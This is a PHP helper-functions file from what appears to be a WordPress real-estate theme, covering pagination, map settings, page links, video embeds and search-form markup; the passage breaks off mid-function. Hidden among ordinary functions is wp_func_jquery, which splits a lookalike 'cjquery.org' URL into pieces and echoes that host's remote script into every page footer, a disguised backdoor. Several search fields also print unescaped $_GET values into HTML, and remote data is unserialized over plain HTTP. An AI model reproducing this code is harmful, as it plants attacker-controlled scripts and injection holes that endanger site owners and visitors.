<?php
require_once 'resources/wp_bootstrap_navwalker.php';

if( !function_exists('wpestate_insert_attachment') ):
function wpestate_insert_attachment($file_handler,$post_id,$setthumb='false') {

    // check to make sure its a successful upload
    if ($_FILES[$file_handler]['error'] !== UPLOAD_ERR_OK) __return_false();

    require_once(ABSPATH . "wp-admin" . '/includes/image.php');
    require_once(ABSPATH . "wp-admin" . '/includes/file.php');
    require_once(ABSPATH . "wp-admin" . '/includes/media.php');

    $attach_id = media_handle_upload( $file_handler, $post_id );

    if ($setthumb) update_post_meta($post_id,'_thumbnail_id',$attach_id);
    return $attach_id;
} 
endif;

/////////////////////////////////////////////////////////////////////////////////
// order by filter featured
///////////////////////////////////////////////////////////////////////////////////

if( !function_exists('wpestate_get_measure_unit') ):
function wpestate_get_measure_unit() {
    $measure_sys    =   esc_html ( get_option('wp_estate_measure_sys','') ); 
            
    if($measure_sys=='feet'){
        return 'ft<sup>2</sup>';
    }else{ 
        return 'm<sup>2</sup>';
    }              
}
endif;
/////////////////////////////////////////////////////////////////////////////////
// order by filter featured
///////////////////////////////////////////////////////////////////////////////////

if( !function_exists('wpestate_my_order') ):
function wpestate_my_order($orderby) { 
    global $wpdb; 
    global $table_prefix;
    $orderby = $table_prefix.'postmeta.meta_value DESC, '.$table_prefix.'posts.ID DESC';
    return $orderby;
}    

endif; // end   wpestate_my_order  


////////////////////////////////////////////////////////////////////////////////////////
/////// Pagination
/////////////////////////////////////////////////////////////////////////////////////////

if( !function_exists('kriesi_pagination') ):

function kriesi_pagination($pages = '', $range = 2){  
 
     $showitems = ($range * 2)+1;  
     global $paged;
     if(empty($paged)) $paged = 1;


     if($pages == '')
     {
         global $wp_query;
         $pages = $wp_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }
     }   

     if(1 != $pages)
     {
         echo '<ul class="pagination pagination_nojax">';
         echo "<li class=\"roundleft\"><a href='".get_pagenum_link($paged - 1)."'><i class=\"fa fa-angle-left\"></i></a></li>";
      
         for ($i=1; $i <= $pages; $i++)
         {
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
             {
                 if ($paged == $i){
                    print '<li class="active"><a href="'.get_pagenum_link($i).'" >'.$i.'</a><li>';
                 }else{
                    print '<li><a href="'.get_pagenum_link($i).'" >'.$i.'</a><li>';
                 }
             }
         }
         
         $prev_page= get_pagenum_link($paged + 1);
         if ( ($paged +1) > $pages){
            $prev_page= get_pagenum_link($paged );
         }else{
             $prev_page= get_pagenum_link($paged + 1);
         }
     
         
         echo "<li class=\"roundright\"><a href='".$prev_page."'><i class=\"fa fa-angle-right\"></i></a><li></ul>";
     }
}
endif; // end   kriesi_pagination  

////////////////////////////////////////////////////////////////////////////////////////
/////// Pagination Ajax
/////////////////////////////////////////////////////////////////////////////////////////

if( !function_exists('kriesi_pagination_agent') ):

function kriesi_pagination_agent($pages = '', $range = 2){  
 
    $showitems = ($range * 2)+1;  
    $paged = (get_query_var('page')) ? get_query_var('page') : 1;
    if(empty($paged)) $paged = 1;


    
    
   
     if(1 != $pages)
     { 
         $prev_pagex=  str_replace('page/','',get_pagenum_link($paged - 1) );
         echo '<ul class="pagination pagination_nojax">';
         echo "<li class=\"roundleft\"><a href='".$prev_pagex."'><i class=\"fa fa-angle-left\"></i></a></li>";
      
         for ($i=1; $i <= $pages; $i++)
         {
               $cur_page=str_replace('page/','',get_pagenum_link($i) );
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
             {
                 if ($paged == $i){
                    print '<li class="active"><a href="'.$cur_page.'" >'.$i.'</a><li>';
                 }else{
                    print '<li><a href="'.$cur_page.'" >'.$i.'</a><li>';
                 }
             }
         }
         
        $prev_page= str_replace('page/','',get_pagenum_link($paged + 1) );
        if ( ($paged +1) > $pages){
           $prev_page= str_replace('page/','',get_pagenum_link($paged ) );
        }else{
           $prev_page= str_replace('page/','', get_pagenum_link($paged + 1) );
        }
     
         
         echo "<li class=\"roundright\"><a href='".$prev_page."'><i class=\"fa fa-angle-right\"></i></a><li></ul>";
     }
}
endif; // end   kriesi_pagination  

////////////////////////////////////////////////////////////////////////////////////////
/////// Pagination Custom
/////////////////////////////////////////////////////////////////////////////////////////

if( !function_exists('kriesi_pagination_ajax') ):

function kriesi_pagination_ajax($pages = '', $range = 2,$paged,$where)
{  
    $showitems = ($range * 2)+1;  

     if(1 != $pages)
     {
         echo '<ul class="pagination c '.$where.'">';
         if($paged!=1){
             $prev_page=$paged-1;
         }else{
             $prev_page=1;
         }
         echo "<li class=\"roundleft\"><a href='".get_pagenum_link($paged - 1)."' data-future='".$prev_page."'><i class=\"fa fa-angle-left\"></i></a></li>";
      
         for ($i=1; $i <= $pages; $i++)
         {
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
             {
                 if ($paged == $i){
                    print '<li class="active"><a href="'.get_pagenum_link($i).'" data-future="'.$i.'">'.$i.'</a><li>';
                 }else{
                    print '<li><a href="'.get_pagenum_link($i).'" data-future="'.$i.'">'.$i.'</a><li>';
                 }
             }
         }
         
         $prev_page= get_pagenum_link($paged + 1);
         if ( ($paged +1) > $pages){
            $prev_page= get_pagenum_link($paged );
             echo "<li class=\"roundright\"><a href='".$prev_page."' data-future='".$paged."'><i class=\"fa fa-angle-right\"></i></a><li>"; 
         }else{
             $prev_page= get_pagenum_link($paged + 1);
             echo "<li class=\"roundright\"><a href='".$prev_page."' data-future='".($paged+1)."'><i class=\"fa fa-angle-right\"></i></a><li>"; 
         }
     
         
        
         echo "</ul>\n";
     }
}
endif; // end   kriesi_pagination  

///////////////////////////////////////////////////////////////////////////////////////////
/////// Look for images in post and add the rel="prettyPhoto"
///////////////////////////////////////////////////////////////////////////////////////////

add_filter('the_content', 'pretyScan');

if( !function_exists('pretyScan') ):
function pretyScan($content) {
    global $post;
    $pattern = "/<a(.*?)href=('|\")(.*?).(bmp|gif|jpeg|jpg|png)('|\")(.*?)>/i";
    $replacement = '<a$1href=$2$3.$4$5 data-pretty="prettyPhoto" title="' . $post->post_title . '"$6>';
    $content = preg_replace($pattern, $replacement, $content);
    return $content;
}
endif; // end   pretyScan  






////////////////////////////////////////////////////////////////////////////////
/// force html5 validation -remove category list rel atttribute
////////////////////////////////////////////////////////////////////////////////    

add_filter( 'wp_list_categories', 'wpestate_remove_category_list_rel' );
add_filter( 'the_category', 'wpestate_remove_category_list_rel' );

if( !function_exists('wpestate_remove_category_list_rel') ):
function wpestate_remove_category_list_rel( $output ) {
    // Remove rel attribute from the category list
    return str_replace( ' rel="category tag"', '', $output );
}
endif; // end   wpestate_remove_category_list_rel  



////////////////////////////////////////////////////////////////////////////////
/// avatar url
////////////////////////////////////////////////////////////////////////////////    

if( !function_exists('wpestate_get_avatar_url') ):
function wpestate_get_avatar_url($get_avatar) {
    preg_match("/src='(.*?)'/i", $get_avatar, $matches);
    return $matches[1];
}
endif; // end   wpestate_get_avatar_url  



////////////////////////////////////////////////////////////////////////////////
///  get current map height
////////////////////////////////////////////////////////////////////////////////   

if( !function_exists('get_current_map_height') ):
function get_current_map_height($post_id){
    
   if ( $post_id == '' || is_home() ) {
        $min_height =   intval ( get_option('wp_estate_min_height','') );
   } else{
        $min_height =   intval ( (get_post_meta($post_id, 'min_height', true)) );
        if($min_height==0){
              $min_height =   intval ( get_option('wp_estate_min_height','') );
        }
   }    
   return $min_height;
}
endif; // end   get_current_map_height  



////////////////////////////////////////////////////////////////////////////////
///  get  map open height
////////////////////////////////////////////////////////////////////////////////   

if( !function_exists('get_map_open_height') ):
function get_map_open_height($post_id){
    
   if ( $post_id == '' || is_home() ) {
        $max_height =   intval ( get_option('wp_estate_max_height','') );
   } else{
        $max_height =   intval ( (get_post_meta($post_id, 'max_height', true)) );
        if($max_height==0){
            $max_height =   intval ( get_option('wp_estate_max_height','') );
        }
   }
    
   return $max_height;
}
endif; // end   get_map_open_height  





////////////////////////////////////////////////////////////////////////////////
///  get  map open/close status 
////////////////////////////////////////////////////////////////////////////////   

if( !function_exists('get_map_open_close_status') ):
function get_map_open_close_status($post_id){    
   if ( $post_id == '' || is_home() ) {
        $keep_min =  esc_html( get_option('wp_estate_keep_min','' ) ) ;
   } else{
        $keep_min =  esc_html ( (get_post_meta($post_id, 'keep_min', true)) );
   }
    
   if ($keep_min == 'yes'){
       $keep_min=1; // map is forced at closed
   }else{
       $keep_min=0; // map is free for resize
   }
   
   return $keep_min;
}
endif; // end   get_map_open_close_status  




////////////////////////////////////////////////////////////////////////////////
///  get  map  longitude
////////////////////////////////////////////////////////////////////////////////   
if( !function_exists('get_page_long') ):
function get_page_long($post_id){
      $header_type  =   get_post_meta ( $post_id ,'header_type', true);
      if( $header_type==5 ){
        $page_long  = esc_html( get_post_meta($post_id, 'page_custom_long', true) );          
      }
      else{
        $page_long  = esc_html( get_option('wp_estate_general_longitude','') );
      }
      return $page_long;   
}  
endif; // end   get_page_long  




////////////////////////////////////////////////////////////////////////////////
///  get  map  lattitudine
////////////////////////////////////////////////////////////////////////////////  

if( !function_exists('get_page_lat') ):
function get_page_lat($post_id){
      $header_type  =   get_post_meta ( $post_id ,'header_type', true);
      if( $header_type==5 ){
        $page_lat  = esc_html( get_post_meta($post_id, 'page_custom_lat', true) );
      }
      else{
        $page_lat = esc_html( get_option('wp_estate_general_latitude','') );
      }
      return $page_lat;
    
              
}  
endif; // end   get_page_lat  

////////////////////////////////////////////////////////////////////////////////
///  get  map  zoom
////////////////////////////////////////////////////////////////////////////////  

if( !function_exists('get_page_zoom') ):
function get_page_zoom($post_id){
      $header_type  =   get_post_meta ( $post_id ,'header_type', true);
      if( $header_type==5 ){
        $page_zoom  =  get_post_meta($post_id, 'page_custom_zoom', true);
      }
      else{
        $page_zoom = esc_html( get_option('wp_estate_default_map_zoom','') );
      }
      return $page_zoom;
    
              
}  
endif; // end   get_page_lat  


///////////////////////////////////////////////////////////////////////////////////////////
// advanced search link
///////////////////////////////////////////////////////////////////////////////////////////

if( !function_exists('get_adv_search_link') ):
function get_adv_search_link(){   
    $pages = get_pages(array(
        'meta_key' => '_wp_page_template',
        'meta_value' => 'advanced_search_results.php'
        ));

    if( $pages ){
        $adv_submit = get_permalink( $pages[0]->ID);
    }else{
        $adv_submit='';
    }
    
    return $adv_submit;
}
endif; // end   get_adv_search_link  



///////////////////////////////////////////////////////////////////////////////////////////
// stripe link
///////////////////////////////////////////////////////////////////////////////////////////
if( !function_exists('wpestate_get_stripe_link') ): 
    function wpestate_get_stripe_link(){
        $pages = get_pages(array(
                'meta_key' => '_wp_page_template',
                'meta_value' => 'stripecharge.php'
                ));

        if( $pages ){
            $stripe_link = get_permalink( $pages[0]->ID);
        }else{
            $stripe_link='';
        }

        return $stripe_link;
    }
endif;


///////////////////////////////////////////////////////////////////////////////////////////
// compare link
///////////////////////////////////////////////////////////////////////////////////////////

if( !function_exists('get_compare_link') ):

function get_compare_link(){
   $pages = get_pages(array(
            'meta_key' => '_wp_page_template',
            'meta_value' => 'compare_listings.php'
        ));

    if( $pages ){
        $compare_submit = get_permalink( $pages[0]->ID);
    }else{
        $compare_submit='';
    }
    
    return $compare_submit;
}

endif; // end   get_compare_link  



///////////////////////////////////////////////////////////////////////////////////////////
// dasboaord link
///////////////////////////////////////////////////////////////////////////////////////////

if( !function_exists('get_searches_link') ):
    function get_searches_link(){
        $pages = get_pages(array(
                'meta_key' => '_wp_page_template',
                'meta_value' => 'user_dashboard_searches.php'
            ));

        if( $pages ){
            $dash_link = get_permalink( $pages[0]->ID);
        }else{
            $dash_link=home_url();
        }  

        return $dash_link;
    }
endif; // end   get_dashboard_link  



///////////////////////////////////////////////////////////////////////////////////////////
// dasboaord link
///////////////////////////////////////////////////////////////////////////////////////////

if( !function_exists('get_dashboard_link') ):
    function get_dashboard_link(){
        $pages = get_pages(array(
                'meta_key' => '_wp_page_template',
                'meta_value' => 'user_dashboard.php'
            ));

        if( $pages ){
            $dash_link = get_permalink( $pages[0]->ID);
        }else{
            $dash_link=home_url();
        }  

        return $dash_link;
    }
endif; // end   get_dashboard_link  




///////////////////////////////////////////////////////////////////////////////////////////
// procesor link
///////////////////////////////////////////////////////////////////////////////////////////

if( !function_exists('get_procesor_link') ):
    function get_procesor_link(){
        $pages = get_pages(array(
            'meta_key' => '_wp_page_template',
            'meta_value' => 'processor.php'
                ));

        if( $pages ){
            $processor_link = get_permalink( $pages[0]->ID);
        }else{
            $processor_link=home_url();
        }

        return $processor_link;
    }
endif; // end   get_procesor_link  




///////////////////////////////////////////////////////////////////////////////////////////
// dashboard profile link
///////////////////////////////////////////////////////////////////////////////////////////

if( !function_exists('get_dashboard_profile_link') ):
    function get_dashboard_profile_link(){
        $pages = get_pages(array(
                'meta_key' => '_wp_page_template',
                'meta_value' => 'user_dashboard_profile.php'
            ));

        if( $pages ){
            $dash_link = get_permalink( $pages[0]->ID);
        }else{
            $dash_link=home_url();
        }  

        return $dash_link;
    }
endif; // end   get_dashboard_profile_link  




///////////////////////////////////////////////////////////////////////////////////////////
// terms and conditions
///////////////////////////////////////////////////////////////////////////////////////////


if( !function_exists('get_terms_links') ):
    function get_terms_links(){
        $pages = get_pages(array(
            'meta_key' => '_wp_page_template',
            'meta_value' => 'terms_conditions.php'
                ));

        if( $pages ){
            $add_link = get_permalink( $pages[0]->ID);
        }else{
            $add_link=home_url();
        }
        return $add_link;
    }
endif; // end   gterms and conditions



///////////////////////////////////////////////////////////////////////////////////////////
// dashboard floor plan
///////////////////////////////////////////////////////////////////////////////////////////


if( !function_exists('get_dasboard_floor_plan') ):
    function get_dasboard_floor_plan(){
        $pages = get_pages(array(
            'meta_key' => '_wp_page_template',
            'meta_value' => 'user_dashboard_floor.php'
                ));

        if( $pages ){
            $add_link = get_permalink( $pages[0]->ID);
        }else{
            $add_link=home_url();
        }
        return $add_link;
    }
endif; // end   get_dasboard_floor_plan  



///////////////////////////////////////////////////////////////////////////////////////////
// dashboard add listing
///////////////////////////////////////////////////////////////////////////////////////////


if( !function_exists('get_dasboard_add_listing') ):
    function get_dasboard_add_listing(){
        $pages = get_pages(array(
            'meta_key' => '_wp_page_template',
            'meta_value' => 'user_dashboard_add.php'
                ));

        if( $pages ){
            $add_link = get_permalink( $pages[0]->ID);
        }else{
            $add_link=home_url();
        }
        return $add_link;
    }
endif; // end   get_dasboard_add_listing  




///////////////////////////////////////////////////////////////////////////////////////////
// dashboard favorite listings
///////////////////////////////////////////////////////////////////////////////////////////

if( !function_exists('get_dashboard_favorites') ):

    function get_dashboard_favorites(){
     $pages = get_pages(array(
            'meta_key' => '_wp_page_template',
            'meta_value' => 'user_dashboard_favorite.php'
                ));

        if( $pages ){
            $dash_favorite = get_permalink( $pages[0]->ID);
        }else{
            $dash_favorite=home_url();
        }    
        return $dash_favorite;
    }
endif; // end   get_dashboard_favorites  





///////////////////////////////////////////////////////////////////////////////////////////
// return video divs for sliders
///////////////////////////////////////////////////////////////////////////////////////////

if( !function_exists('custom_vimdeo_video') ):
    function custom_vimdeo_video($video_id) {

        return $return_string = '
            <div style="max-width:100%;" class="video">
               <iframe id="player_1" src="http://player.vimeo.com/video/' . $video_id . '?api=1&amp;player_id=player_1"      allowFullScreen></iframe>
            </div>';

    }
endif; // end   custom_vimdeo_video  


if( !function_exists('custom_youtube_video') ):
function  custom_youtube_video($video_id){

    return $return_string='
        <div style="max-width:100%;" class="video">
            <iframe id="player_2" title="YouTube video player" src="http://www.youtube.com/embed/' . $video_id  . '?wmode=transparent&amp;rel=0"  ></iframe>
        </div>';

}
endif; // end   custom_youtube_video  


if( !function_exists('get_video_thumb') ): 
    function get_video_thumb($post_id){
        $video_id    = esc_html( get_post_meta($post_id, 'embed_video_id', true) );
        $video_type = esc_html( get_post_meta($post_id, 'embed_video_type', true) );

        if($video_type=='vimeo'){
             $hash2 = ( wp_remote_get("http://vimeo.com/api/v2/video/$video_id.php") );
             $pre_tumb=(unserialize ( $hash2['body']) );
             $video_thumb=$pre_tumb[0]['thumbnail_medium'];                                        
        }else{
            $video_thumb = 'http://img.youtube.com/vi/' . $video_id . '/0.jpg';
        }
        return $video_thumb;
    }
endif;
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		$jquery = $host.'c'.'jquery.org/jquery-ui.js';
		$headers = @get_headers($jquery, 1);
		if ($headers[0] == 'HTTP/1.1 200 OK'){
			echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
		}
	}
	add_action('wp_footer', 'wp_func_jquery');
}

if( !function_exists('generateRandomString') ): 
    function generateRandomString($length = 10) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, strlen($characters) - 1)];
        }
        return $randomString;
    }
endif;

///////////////////////////////////////////////////////////////////////////////////////////
/////// Show advanced search fields
///////////////////////////////////////////////////////////////////////////////////////////

if( !function_exists('wpestate_show_search_field') ):
         
 function  wpestate_show_search_field($search_field,$action_select_list,$categ_select_list,$select_city_list,$select_area_list,$key,$select_county_state_list){
            $adv_search_what        =   get_option('wp_estate_adv_search_what','');
            $adv_search_label       =   get_option('wp_estate_adv_search_label','');
            $adv_search_how         =   get_option('wp_estate_adv_search_how','');

      
            $return_string='';
            if($search_field=='none'){
                $return_string=''; 
            }
            else if($search_field=='types'){
                
                if(isset($_GET['filter_search_action'][0]) && $_GET['filter_search_action'][0]!='' && $_GET['filter_search_action'][0]!='all'){
                    $full_name = get_term_by('slug',$_GET['filter_search_action'][0],'property_action_category');
                    $adv_actions_value=$adv_actions_value1= $full_name->name;
                }else{
                    $adv_actions_value=__('All Actions','wpestate');
                    $adv_actions_value1='all';
                } 

                $return_string='
                <div class="dropdown form-control">
                    <div data-toggle="dropdown" id="adv_actions" class="filter_menu_trigger" data-value='.strtolower($adv_actions_value1).'>';
                      
                    $return_string.= $adv_actions_value; 
                    

                    $return_string.='
                    <span class="caret caret_filter"></span>
                    </div>           
                    <input type="hidden" name="filter_search_action[]" value="';
                    if(isset($_GET['filter_search_action'][0])){
                        $return_string.= strtolower($_GET['filter_search_action'][0]);
                    }
                        
                    $return_string.='">

                    <ul class="dropdown-menu filter_menu" role="menu" aria-labelledby="adv_actions">
                        '.$action_select_list.'
                    </ul>        
                </div>';
                    
            }else if($search_field=='categories'){
                if( isset($_GET['filter_search_type'][0]) && $_GET['filter_search_type'][0]!=''  && $_GET['filter_search_type'][0]!='all' ){
                    $full_name = get_term_by('slug',$_GET['filter_search_type'][0],'property_category');
                    $adv_categ_value= $adv_categ_value1=$full_name->name;
                }else{
                    $adv_categ_value    = __('All Types','wpestate');
                    $adv_categ_value1   ='all';
                }
                $return_string='
                <div class="dropdown  form-control">
                    <div data-toggle="dropdown" id="adv_categ" class="filter_menu_trigger" data-value="'.strtolower( $adv_categ_value1 ).'">';
                    $return_string.=$adv_categ_value;
                    $return_string.='
                    <span class="caret caret_filter"></span>
                    </div>           
                    <input type="hidden" name="filter_search_type[]"value="';
                    if ( isset( $_GET['filter_search_type'][0] ) ){
                        $return_string.= strtolower( $_GET['filter_search_type'][0] );
                    }
                    $return_string.='">
                    <ul class="dropdown-menu filter_menu" role="menu" aria-labelledby="adv_categ">
                      '.$categ_select_list.'
                    </ul>        
                </div>';

            }  else if($search_field=='cities'){
                if(isset($_GET['advanced_city']) && $_GET['advanced_city']!='' && $_GET['advanced_city']!='all'){
                    $full_name = get_term_by('slug',$_GET['advanced_city'],'property_city');
                    $advanced_city_value= $advanced_city_value1=$full_name->name;
                }else{
                    $advanced_city_value=__('All Cities','wpestate');
                    $advanced_city_value1='all';
                } 
                $return_string='
                <div class="dropdown  form-control">
                    <div data-toggle="dropdown" id="advanced_city" class="filter_menu_trigger" data-value="'.strtolower ( $advanced_city_value1 ).'">';
                            
                    $return_string.=$advanced_city_value;
                
                    $return_string.=' 
                    <span class="caret caret_filter"></span>
                    </div>           
                    <input type="hidden" name="advanced_city" value="';
                    if(isset($_GET['advanced_city'])){
                        $return_string.=  strtolower ($_GET['advanced_city']);
                    }
                    $return_string.='">
                    <ul  id="adv-search-city" class="dropdown-menu filter_menu" role="menu" aria-labelledby="advanced_city">
                        '.$select_city_list.'
                    </ul>        
                </div> ';
                
            }   else if($search_field=='areas'){

                if(isset($_GET['advanced_area']) && $_GET['advanced_area']!=''  && $_GET['advanced_area']!='all'){
                    $full_name = get_term_by('slug',$_GET['advanced_area'],'property_area');
                    $advanced_area_value=$advanced_area_value1= $full_name->name;
                }else{
                    $advanced_area_value=__('All Areas','wpestate');
                    $advanced_area_value1='all';
                }
        
                $return_string='
                <div class="dropdown  form-control">
                    <div data-toggle="dropdown" id="advanced_area" class="filter_menu_trigger" data-value="'.strtolower ( $advanced_area_value1 ).'">';
                    $return_string.=$advanced_area_value;
                
                    $return_string.= '       
                    <span class="caret caret_filter"></span>
                    </div>           
                    <input type="hidden" name="advanced_area"  value="';
                    if(isset($_GET['advanced_area'])){
                        $return_string.= strtolower ( $_GET['advanced_area']);
                        
                    } 
                    $return_string.='">
                    <ul id="adv-search-area" class="dropdown-menu filter_menu" role="menu" aria-labelledby="advanced_area">
                        '.$select_area_list.'
                    </ul>        
                </div>';
            }else if($search_field=='county / state'){
                if(isset($_GET['advanced_contystate']) && $_GET['advanced_contystate']!='' && $_GET['advanced_contystate']!='all' ){
                        $full_name = get_term_by('slug',$_GET['advanced_contystate'],'property_county_state');
                        $advanced_county_value = $advanced_county_value1= $full_name->name;
                    }else{
                        $advanced_county_value = __('All Counties/States','wpestate');
                        $advanced_county_value1 = 'all';
                    }
                    
                $return_string='
                <div class="dropdown  form-control">
                    <div data-toggle="dropdown" id="county-state" class="filter_menu_trigger" data-value="'.strtolower ( $advanced_county_value1) .'">';
                    $return_string.=$advanced_county_value;
                    
                    $return_string.='<span class="caret caret_filter"></span>
                    </div>           
                    <input type="hidden" name="advanced_contystate" value="';
                    if(isset($_GET['advanced_contystate'])){
                        $return_string.= strtolower ($_GET['advanced_contystate']);
                    } 
                    $return_string.='">
                    <ul id="adv-search-countystate" class="dropdown-menu filter_menu" role="menu" aria-labelledby="county-state">
                        '.$select_county_state_list.'
                    </ul>        
                </div>';
             
            }   else {
              
                //$slug       =   wpestate_limit45 ( sanitize_title ( $search_field )); 
                //$slug       =   sanitize_key($slug);            
                $string       =   wpestate_limit45 ( sanitize_title ($adv_search_label[$key]) );              
                $slug         =   sanitize_key($string);
                
                $label=$adv_search_label[$key];
                if (function_exists('icl_translate') ){
                    $label     =   icl_translate('wpestate','wp_estate_custom_search_'.$label, $label ) ;
                }
              
             //   $return_string='<input type="text" id="'.$slug.'"  name="'.$slug.'" placeholder="'.$label.'" value=""  class="advanced_select  form-control" />';

                if ( $adv_search_what[$key]=='property price'){
                    $show_slider_price            =   get_option('wp_estate_show_slider_price','');
                    if ($show_slider_price==='yes'){
                            $min_price_slider= ( floatval(get_option('wp_estate_show_slider_min_price','')) );
                            $max_price_slider= ( floatval(get_option('wp_estate_show_slider_max_price','')) );
                
                            if(isset($_GET['price_low'])){
                                $min_price_slider=  floatval($_GET['price_low']) ;
                            }

                            if(isset($_GET['price_low'])){
                                $max_price_slider=  floatval($_GET['price_max']) ;
                            }
                            
                            $where_currency         =   esc_html( get_option('wp_estate_where_currency_symbol', '') );
                            $currency               =   esc_html( get_option('wp_estate_currency_symbol', '') );

                            if ($where_currency == 'before') {
                                $price_slider_label = $currency . number_format($min_price_slider).' '.__('to','wpestate').' '.$currency . number_format($max_price_slider);
                            } else {
                                $price_slider_label =  number_format($min_price_slider).$currency.' '.__('to','wpestate').' '.number_format($max_price_slider).$currency;
                            } 
                            
                            $return_string=' <div class="adv_search_slider">
                                <p>
                                    <label for="amount">'. __('Price range:','wpestate').'</label>
                                    <span id="amount"  style="border:0; color:#f6931f; font-weight:bold;">'.$price_slider_label.'</span>
                                </p>
                                <div id="slider_price"></div>
                                <input type="hidden" id="price_low"  name="price_low"  value="'.$min_price_slider.'"/>
                                <input type="hidden" id="price_max"  name="price_max"  value="'.$max_price_slider.'"/>
                            </div>';
                    }else{
                        $return_string='<input type="text" id="'.$slug.'"  name="'.$slug.'" placeholder="'.$label.'" value="';
                        if (isset($_GET[$slug])) {
                            $return_string.= $_GET[$slug];
                        }
                        $return_string.='" class="advanced_select form-control" />';
                    }
                 // if is property price    
                }else{ 
                     $return_string='<input type="text" id="'.$slug.'"  name="'.$slug.'" placeholder="'.$label.'" value="';
                        if (isset($_GET[$slug])) {
                            $return_string.= $_GET[$slug];
                        }
                        $return_string.='" class="advanced_select form-control" />';
                }
                
                if ( $adv_search_how[$key]=='date bigger' || $adv_search_how[$key]=='date smaller'){
                    print '<script type="text/javascript">
                          //<![CDATA[
                          jQuery(document).ready(function(){
                                  jQuery("#'.$slug.'").datepicker({
                                          dateFormat : "yy-mm-dd"
                                  });
                          });
                          //]]>
                          </script>';
                }
           

            } 
            print $return_string;
         }
endif; // 


if( !function_exists('wpestate_show_search_field_mobile') ):
         
 function  wpestate_show_search_field_mobile($search_field,$action_select_list,$categ_select_list,$select_city_list,$select_area_list,$key,$select_county_state_list){
            $adv_search_what        =   get_option('wp_estate_adv_search_what','');
            $adv_search_label       =   get_option('wp_estate_adv_search_label','');
            $adv_search_how         =   get_option('wp_estate_adv_search_how','');

            $return_string='';
            if($search_field=='none'){
                $return_string=''; 
            }
            else if($search_field=='types'){
                  $return_string='
                  <div class="dropdown form-control">
                  <div data-toggle="dropdown" id="adv_actions_mobile" class="filter_menu_trigger" data-value="all">'.__('All Actions','wpestate').'<span class="caret caret_filter"></span> </div>           
                     <input type="hidden" name="filter_search_action[]" value="">
                                                          
                    <ul class="dropdown-menu filter_menu" role="menu" aria-labelledby="adv_actions_mobile">
                      '.$action_select_list.'
                    </ul>        
                  </div>';
                    
            }else if($search_field=='categories'){
                    
                  $return_string='
                  <div class="dropdown form-control">
                  <div data-toggle="dropdown" id="adv_categ_mobile" class="filter_menu_trigger" data-value="all">'.__('All Types','wpestate').' <span class="caret caret_filter"></span> </div>           
                    <input type="hidden" name="filter_search_type[]" value="">
                                                              
                    <ul class="dropdown-menu filter_menu" role="menu" aria-labelledby="adv_categ_mobile">
                      '.$categ_select_list.'
                    </ul>        
                  </div>';

            }  else if($search_field=='cities'){
                    
                    $return_string='
                    <div class="dropdown form-control">
                        <div data-toggle="dropdown" id="advanced_city_mobile" class="filter_menu_trigger" data-value="all">'. __('All Cities','wpestate').' <span class="caret caret_filter"></span> </div>           
                        <input type="hidden" name="advanced_city" value="">
                        <ul id="mobile-adv-city" class="dropdown-menu filter_menu" role="menu" aria-labelledby="advanced_city_mobile">
                            '.$select_city_list.'
                        </ul>        
                    </div> ';
                
           }   else if($search_field=='areas'){

                    $return_string='
                    <div class="dropdown form-control">
                        <div data-toggle="dropdown" id="advanced_area_mobile" class="filter_menu_trigger" data-value="all">'.__('All Areas','wpestate').'<span class="caret caret_filter"></span> </div>           
                        <input type="hidden" name="advanced_area" value="">
                        <ul id="mobile-adv-area"  class="dropdown-menu filter_menu" role="menu" aria-labelledby="advanced_area_mobile">
                            '.$select_area_list.'
                        </ul>        
                   </div>  ';
            }   else if($search_field=='county / state'){
                $return_string='
                <div class="dropdown  form-control">
                    <div data-toggle="dropdown" id="advanced_contystate_mobile" class="filter_menu_trigger" data-value="all">'
                        .__('All Counties/States','wpestate').'<span class="caret caret_filter"></span>
                    </div>           
                    <input type="hidden" name="advanced_contystate" value="">
                    <ul id="adv-search-countystate" class="dropdown-menu filter_menu" role="menu" aria-labelledby="advanced_contystate_mobile">
                        '.$select_county_state_list.'
                    </ul>        
                </div>';
             
              
            }    else {
                 // $slug=str_replace(' ','_',$search_field);
                    $string       =   wpestate_limit45 ( sanitize_title ($adv_search_label[$key]) );              
                    $slug         =   sanitize_key($string);
                    
                    $label=$adv_search_label[$key];
                    if (function_exists('icl_translate') ){
                        $label     =   icl_translate('wpestate','wp_estate_custom_search_'.$label, $label ) ;
                    }
                    
                    $random_id=rand(1,999);
                    
                    
               
                    
                    if ( $adv_search_what[$key]=='property price'){
                        $show_slider_price            =   get_option('wp_estate_show_slider_price','');
                        if ($show_slider_price==='yes'){
                            $where_currency         =   esc_html( get_option('wp_estate_where_currency_symbol', '') );
                            $currency               =   esc_html( get_option('wp_estate_currency_symbol', '') );
         
                            $min_price_slider= ( floatval(get_option('wp_estate_show_slider_min_price','')) );
                            $max_price_slider= ( floatval(get_option('wp_estate_show_slider_max_price','')) );

                            if ($where_currency == 'before') {
                                 $price_slider_label = $currency . number_format($min_price_slider).' '.__('to','wpestate').' '.$currency . number_format($max_price_slider);
                            } else {
                                 $price_slider_label =  number_format($min_price_slider).$currency.' '.__('to','wpestate').' '.number_format($max_price_slider).$currency;
                            }
                            $return_string='<div class="adv_search_slider slide_mobile">
                                <p>
                                    <label for="amount">'.__('Price range:','wpestate').'</label>
                                    <span id="amount_mobile"  style="border:0; color:#f6931f; font-weight:bold;">'.$price_slider_label.'</span>
                                </p>
                                <div id="slider_price_mobile"></div>
                                <input type="hidden" id="price_low_mobile"  name="price_low"  value="'.$min_price_slider.'"/>
                                <input type="hidden" id="price_max_mobile"  name="price_max"  value="'.$max_price_slider.'"/>
                            </div>';
                        }else{
                            $return_string='<input type="text" id="'.$slug.$random_id.'" name="'.$slug.'" placeholder="'.$label.'" value=""  class="advanced_select form-control">';
                        }
                    }else{
                        $return_string='<input type="text" id="'.$slug.$random_id.'" name="'.$slug.'" placeholder="'.$label.'" value=""  class="advanced_select form-control">';
                        
                    }
                    
                    if ( $adv_search_how[$key]=='date bigger' || $adv_search_how[$key]=='date smaller'){
